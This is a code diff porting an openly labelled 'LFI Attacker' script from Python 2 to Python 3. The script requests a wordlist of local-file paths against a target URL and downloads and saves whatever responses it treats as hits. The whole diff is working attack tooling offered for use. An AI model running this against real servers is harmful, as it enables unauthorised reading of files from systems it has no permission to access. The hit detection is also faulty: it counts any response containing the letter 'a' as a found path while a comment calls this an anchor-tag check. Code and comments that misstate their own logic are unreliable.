@@ -1,139 +1,156 @@
-#!/usr/bin/python
-# -*- code: utf-8 -*-
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
 import requests
 import argparse
 import os
-import pathlib2
-from urlparse import urlparse
+import sys
+from urllib.parse import urlparse
 
-print ("""\033[1;36m
+BANNER = r"""
       		   __    _____ _ ___   __  __                __
 	 (@_      / /   / ____(_)   | / /_/ /_ _____ _______/ /____  ______
 	  ) \____/ /___/ /___/ / /\ |/  _/  _// __ `/ ___/ / /  _  \/ ____/__________
 (_)@8@8{}<   ___/ /___/ __/_/ / /_| |/ / / / / / / / /  /   /  \_/ / /_______________>
 	  )_/  / /___/ /   / / __   / /_/ /_/ /_/ / /__/   /  ____/ /
 	 (@   /_____/_/   /_/_/  |__\__/\__/\__,_/\___/_/|_|\____/_/
-""")
-print "		====> [ LFI Attacker ]		[ Author: FachrulRH ] <===="
-print "		====> [ Good Luck :) ]		[ ig: @fachrull.rh  ] <====\n"			 
-parser = argparse.ArgumentParser()
+"""
 
-# Here the arguments
-parser.add_argument("-u", help="Target URL i.e http://www.example.com/", dest='target')
-parser.add_argument("--path", help="Add your Custom Directory", dest='path')
-parser.add_argument("--type", help="Server OS Type i.e Linux or Windows", dest='type')
+print("\033[1;36m" + BANNER + "\033[0m")
+print("====> [ LFI Attacker ]\t\t[ Author: FachrulRH ] <====")
+print("====> [ Good Luck :) ]\t\t[ ig: @fachrull.rh  ] <====\n")
 
-args = parser.parse_args() # Argument will ber parsed
+parser = argparse.ArgumentParser(description="LFI Attacker (Python3 port)")
+parser.add_argument("-u", "--url", help="Target URL e.g. http://www.example.com/", dest='target', required=True)
+parser.add_argument("--path", help="Add your Custom Directory (appended to target)", dest='path', default='')
+parser.add_argument("--type", help="Server OS Type i.e. linux or windows", dest='type', default='linux')
 
-target = args.target # Get target from arguments
+args = parser.parse_args()
 
-try:
-	target = target.replace('https://', '')
-except:
-	print('\033[0;31m[-] -u argument not supplied. see lfi-attack -h for help')
-	quit()
+target = args.target.strip()
+if not (target.startswith('http://') or target.startswith('https://')):
+    target = 'http://' + target
 
-target = target.replace('http://', '')
-target = 'http://' + target
+if args.path:
+    # ensure path begins with a slash
+    if not args.path.startswith('/'):
+        target = target + '/' + args.path
+    else:
+        target = target + args.path
 
-if args.path != None:
-	target = target + args.path
-
-# Scan the link and put the founds link to list founds
+# Scan the link and put the found links to list founds
 founds = []
 def scan(links):
-	try:
-		for link in links:
-			link = target + link
-			req = requests.get(link)
-			content = req.headers.get('Content-Type')	
-			if 'a' in req.text:
-				print('\033[0;32m[+] Path found !: %s'% link)
-				founds.append(link) 
-			else:
-				print('\033[0;31m[-] %s'% link)
-	except KeyboardInterrupt:
-		print("\nCTRL+C detected !")
-		print("\033[0;36mSystem quit.....")
-		quit()
+    try:
+        for link in links:
+            full = target.rstrip('/') + '/' + link.lstrip('/')
+            try:
+                req = requests.get(full, timeout=10)
+            except requests.RequestException as e:
+                print(f'\033[0;31m[-] Request error for {full}: {e}')
+                continue
 
-# Get path list from lfi-path.txt
+            # optionally inspect content-type
+            content_type = req.headers.get('Content-Type', '')
+            # crude check: look for anchor tags in response text
+            text = req.text if req.encoding or 'text' in content_type else ''
+            if 'a' in text:
+                print(f'\033[0;32m[+] Path found !: {full}')
+                founds.append(full)
+            else:
+                print(f'\033[0;31m[-] {full}')
+    except KeyboardInterrupt:
+        print("\nCTRL+C detected !")
+        print("\033[0;36mSystem quit.....")
+        sys.exit(1)
+
+# Get path list from lfi-paths.txt
 paths = []
-def get_paths(type):
-	try:
-		with open('lfi-paths.txt','r') as wordlist:
-			for directory in wordlist:
-				directory = str(directory.replace("\n",""))
-				try:
-					if 'windows' in type:
-						if 'var' in directory or 'usr' in directory or 'srv' in directory or 'Library' in directory or 'apache' in directory or 'proc' in directory or 'sbin' in directory:
-							pass
-						else:
-							paths.append(directory)
-					if 'linux' in type:
-						if 'C:' in directory:
-							pass
-						else:
-							paths.append(directory)
-				except:
-					paths.append(directory)
-	except IOError:
-		print('\033[0;31m[-] Wordlist not found!')
-		quit()
+def get_paths(os_type):
+    t = (os_type or '').lower()
+    try:
+        with open('lfi-paths.txt', 'r', encoding='utf-8', errors='ignore') as wordlist:
+            for directory in wordlist:
+                directory = directory.strip()
+                if not directory:
+                    continue
+                try:
+                    if 'windows' in t:
+                        # skip typical *nix paths when windows selected
+                        if any(p in directory for p in ('var', 'usr', 'srv', 'Library', 'apache', 'proc', 'sbin')):
+                            continue
+                        paths.append(directory)
+                    elif 'linux' in t:
+                        # skip windows C: paths on linux selection
+                        if 'C:' in directory:
+                            continue
+                        paths.append(directory)
+                    else:
+                        # unknown type -> include all
+                        paths.append(directory)
+                except Exception:
+                    paths.append(directory)
+    except IOError:
+        print('\033[0;31m[-] Wordlist (lfi-paths.txt) not found!')
+        sys.exit(1)
 
 # Get domain name for folder name
 parse = urlparse(target)
-nhost = parse.netloc
+nhost = parse.netloc or 'output'
 
 # Get file names in found urls
 fnames = []
-def get_name(founds):
-	for gname in founds:
-		gname = gname.split("/")[-1]
-		fnames.append(gname)
+def get_name(founds_list):
+    for gname in founds_list:
+        name = gname.rstrip('/').split('/')[-1] or 'index'
+        fnames.append(name)
 
 def directory():
-	if os.path.exists(nhost):
-		os.chdir(nhost)
-	else:
-		os.mkdir(nhost)
-		os.chdir(nhost)	
+    if not os.path.exists(nhost):
+        os.makedirs(nhost, exist_ok=True)
+    os.chdir(nhost)
 
 # Get the files in found urls
 def get_files(files, names):
-	for file, name in zip(files, names):
-		req = requests.get(file)
-		content = req.content
-		stat = req.status_code
-		if stat == 200:
-			print("\033[0;32m[+] Succes to get: %s" % file)
-			print("\033[0;36mSaving the file.....")
-			name = open("%s.txt" % name, 'w')
-			name.write(content)
-			name.close()
-			print("\033[0;32m[+] Success!\n")
-		elif stat == 302:
-			print("\033[0;31m[-] Failed to get : %s" % file)
-		elif stat == 404:
-			print("\033[0;31m[-] Failed to get : %s" % file)
-		else:
-			print("\033[0;31m[-] Failed to get : %s" % file)								
+    for file, name in zip(files, names):
+        try:
+            req = requests.get(file, timeout=10)
+        except requests.RequestException as e:
+            print(f'\033[0;31m[-] Request failed for {file}: {e}')
+            continue
+
+        stat = req.status_code
+        if stat == 200:
+            print(f"\033[0;32m[+] Success to get: {file}")
+            print("\033[0;36mSaving the file.....")
+            # save as bytes (may be binary)
+            try:
+                with open(f"{name}.txt", 'wb') as f:
+                    f.write(req.content)
+                print("\033[0;32m[+] Success!\n")
+            except OSError as e:
+                print(f'\033[0;31m[-] Failed to save {name}.txt: {e}')
+        else:
+            print(f'\033[0;31m[-] Failed to get : {file} (status {stat})')
 
 # Start getting files and save the files
 def end():
-	total = len(founds)
-	print("\n\033[0;32mPath founds : %i"% total)
+    total = len(founds)
+    print(f"\n\033[0;32mPath founds : {total}")
 
-type = args.type
-get_paths(type)
+# main flow
+get_paths(args.type)
 links = paths
 scan(links)
 end()
-directory()
-get_name(founds)
-files = founds
-names = fnames
-get_files(files, names)
-where = os.getcwd()
-print("\033[0;36m[+] Succes file save in %s"% where)
+
+if founds:
+    directory()
+    get_name(founds)
+    files = founds
+    names = fnames
+    get_files(files, names)
+    where = os.getcwd()
+    print(f"\033[0;36m[+] Success file save in {where}")
+else:
+    print("\033[0;33m[!] No paths found, nothing to save.")
